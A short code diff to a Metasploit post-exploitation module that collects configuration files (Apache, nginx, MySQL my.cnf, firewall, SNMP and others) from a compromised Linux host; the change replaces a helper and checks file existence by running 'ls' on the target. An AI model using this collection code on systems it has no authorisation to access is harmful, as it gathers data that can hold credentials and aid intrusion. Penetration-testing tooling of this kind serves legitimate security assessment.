@@ -66,12 +66,6 @@ class Metasploit3 < Msf::Post
 		return host
 	end
 
-	def cat_file(filename)
-		vprint_status("Download: #{filename}")
-		output = read_file(filename)
-		return output
-	end
-
 	def find_configs
 		configs =["/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf", "/etc/nginx/nginx.conf",
 			"/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf", "/etc/security.access.conf", "/etc/shells",
@@ -82,9 +76,9 @@ class Metasploit3 < Msf::Post
 			"/etc/snmp/snmp.conf"]
 
 		configs.each do |f|
-			if ::File.exist?("#{f}") == true
-				output = cat_file("#{f}")
-				save("Found #{f} \nStoring as: ",  output)
+			if cmd_exec("/bin/ls '#{f}'") == "#{f}"
+				output = read_file("#{f}")
+				save("Found #{f} \nConfiguration",  output)
 			end
 		end
 	end
